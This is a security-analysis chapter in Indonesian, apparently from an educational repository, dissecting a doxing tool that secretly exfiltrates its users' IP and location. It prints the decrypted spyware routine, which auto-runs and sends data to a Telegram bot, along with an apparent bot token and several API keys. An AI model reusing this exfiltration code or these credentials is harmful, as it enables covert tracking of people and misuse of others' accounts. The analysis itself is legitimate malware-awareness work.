# 3. Risiko Keamanan yang Teridentifikasi

## Peringatan

⚠️ **Perhatian Penting:**  
Repositori ini bertujuan untuk edukasi keamanan siber. Informasi di dalamnya membedah sebuah tools yang beredar di internet untuk menunjukkan risiko nyata dari menjalankan perangkat lunak dari sumber yang tidak terpercaya. Jangan pernah menjalankan tools asli yang dianalisis di sini.

## Pendahuluan

Setelah berhasil mendekripsi dan menganalisis kode sumber utama dari tools **DOXING-TOOLS** oleh Rolandino, kami menemukan beberapa risiko keamanan serius yang tersembunyi di dalamnya. Tools ini tidak hanya berfungsi sebagai alat pencarian data (doxing), tetapi juga mencuri data pribadi pengguna secara diam-diam dan mengirimkannya ke penulis tools melalui API Telegram.

File dekripsi lengkap dapat ditemukan di: [`/evidence/source_code/2_decrypted_source_code.py`](../evidence/source_code/2_decrypted_source_code.py).

## Risiko Utama

### 1. **Spyware Tersembunyi**

Fungsi utama yang ditemukan dalam kode sumber adalah spyware yang secara otomatis mengumpulkan data pribadi pengguna tanpa izin. Berikut adalah detailnya:

#### Fungsi Spyware

```python
TELEGRAM_BOT_TOKEN = "AAE5fo3b8v_CQVC2f2M3SscdLqHfBGeux50"
TELEGRAM_CHAT_ID = "7413457967"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        requests.post(url, data=data)
    except:
        pass

def collect_and_send_user_info():
    try:
        ip_data = requests.get("https://ipinfo.io/json").json()
        msg = f"""New Access
IP: {ip_data.get('ip')}
City: {ip_data.get('city')}
Country: {ip_data.get('country')}
Org: {ip_data.get('org')}
"""
        send_to_telegram(msg)
    except:
        pass

# Fungsi ini dipanggil secara otomatis saat skrip dijalankan
collect_and_send_user_info()
```

#### Analisis Fungsi

- **Pengumpulan Data Pengguna:**  
  Fungsi `collect_and_send_user_info()` mengumpulkan informasi pribadi pengguna, termasuk:
  
  - **Alamat IP Publik:** Digunakan untuk melacak lokasi pengguna.
  - **Kota dan Negara:** Memberikan lokasi geografis pengguna.
  - **Penyedia Layanan Internet (ISP):** Mengungkapkan penyedia layanan internet yang digunakan pengguna.

- **Pengiriman Rahasia:**  
  Semua informasi tersebut dikirimkan secara diam-diam ke akun Telegram milik penulis tools menggunakan token bot (`TELEGRAM_BOT_TOKEN`) dan ID chat (`TELEGRAM_CHAT_ID`). Pengguna tidak akan menyadari bahwa data mereka sedang dicuri.

### 2. **Enkripsi Kode Sumber**

Kode sumber utama tools ini dienkripsi menggunakan teknik **Base64 berlapis**. Tindakan ini adalah indikator kuat bahwa penulis tools ingin menyembunyikan fungsi berbahaya dari pengguna. Enkripsi ini membuat kode sulit dibaca dan dianalisis, sehingga pengguna yang tidak waspada tidak akan mengetahui adanya spyware.

### 3. **Limitasi Penggunaan Harian**

Tools ini memiliki mekanisme limitasi penggunaan harian yang mencatat aktivitas pengguna dalam file JSON (`user_limit.json`). Hal ini menunjukkan bahwa penulis tools ingin memantau siapa saja yang menggunakan tools ini. Berikut adalah contoh implementasi limitasi penggunaan:

```python
LIMIT = 6
DATA_FILE = 'user_limit.json'

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f)

def can_use(user_id):
    data = load_data()
    today = datetime.now().strftime('%Y-%m-%d')
    if user_id not in data:
        data[user_id] = {"date": today, "count": 0}
    if data[user_id]['date'] != today:
        data[user_id] = {"date": today, "count": 0}
    if data[user_id]['count'] < LIMIT:
        data[user_id]['count'] += 1
        save_data(data)
        return True, LIMIT - data[user_id]['count']
    else:
        return False, 0
```

#### Risiko:

- **Pengumpulan Metadata:**  
  File `user_limit.json` mencatat ID pengguna dan jumlah akses harian. Informasi ini dapat digunakan untuk melacak aktivitas pengguna.

- **Potensi Penyalahgunaan:**  
  Penulis tools dapat menggunakan metadata ini untuk tujuan yang tidak etis, seperti melacak pola aktivitas pengguna atau mengidentifikasi target tertentu.

### 4. **API Key yang Rentan**

Tools ini menggunakan banyak API key publik maupun premium untuk mengakses layanan eksternal. Beberapa API key rentan disalahgunakan jika jatuh ke tangan yang salah. Contohnya:

```python
API_KEY_NUMVERIFY = "d9fecb24eeb4f485fe8539ffa5ccfb45"
API_KEY_VERIPHONE = "E28C1E73072841F0A3CF93FFE936F369"
API_KEY_RAPIDAPI = "6f6be78672msh90081e9e01ae3adp1c3959jsn793c499831a8"
```

#### Risiko:

- **Penyalahgunaan API Key:**  
  Jika API key ini bocor, pihak ketiga dapat menggunakannya untuk melakukan serangan atau aktivitas ilegal lainnya.

- **Ketergantungan pada Layanan Eksternal:**  
  Tools ini bergantung pada ratusan API eksternal, yang dapat menjadi vektor serangan tambahan jika layanan tersebut rentan.

### 5. **Komunikasi dengan API Berbahaya**

Tools ini terhubung dengan beberapa API berbahaya yang dapat digunakan untuk tujuan ilegal, seperti:

- **Phishing Scanner:** Memeriksa URL untuk menentukan apakah itu phishing.
- **Malicious Scanner:** Menganalisis alamat IP atau domain untuk menentukan apakah itu berbahaya.
- **Dark Web Search:** Mencari data sensitif di dark web.

Contoh penggunaan API berbahaya:

```python
("https://malicious-scanner.p.rapidapi.com/rapid/url?url={query}", "rapidapi_maliciousscanner")
```

#### Risiko:

- **Eksploitasi Data Sensitif:**  
  API ini dapat digunakan untuk mencari data pribadi pengguna di dark web atau memverifikasi validitas nomor telepon, email, atau alamat IP.

## Kesimpulan

Tools **DOXING-TOOLS** oleh Rolandino bukan hanya alat doxing biasa, tetapi juga berfungsi sebagai spyware yang mencuri data pribadi pengguna secara diam-diam. Risiko keamanan utama meliputi:

1. Spyware tersembunyi yang mengumpulkan data pengguna.
2. Enkripsi kode sumber untuk menyembunyikan fungsi berbahaya.
3. Limitasi penggunaan harian yang mencatat aktivitas pengguna.
4. API key rentan yang dapat disalahgunakan.
5. Komunikasi dengan API berbahaya untuk tujuan ilegal.

Tools ini adalah contoh nyata bahaya menjalankan perangkat lunak dari sumber yang tidak terpercaya, terutama jika kode sumbernya disembunyikan. Kami sangat menyarankan agar komunitas selalu memeriksa kode sumber sebelum menjalankan perangkat lunak apa pun.

Untuk rekomendasi lebih lanjut tentang cara melindungi diri dari ancaman serupa, silakan baca file [**4_conclusion_and_recommendations.md**](analysis/4_conclusion_and_recommendations.md).